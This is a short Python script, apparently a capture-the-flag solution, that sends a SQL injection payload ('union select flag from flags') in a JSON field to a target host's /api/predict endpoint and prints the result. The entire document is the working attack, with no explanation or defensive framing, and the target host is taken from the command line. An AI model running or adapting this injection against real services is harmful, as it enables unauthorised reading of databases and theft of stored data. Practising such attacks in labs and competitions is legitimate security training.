#!/usr/bin/env python3
import requests
import sys

HOST = sys.argv[1]

r = requests.post(HOST + '/api/predict', headers={'Content-Type': 'application/json'}, json={'q': '\\\' union select flag from flags -- '})

print(r.text)
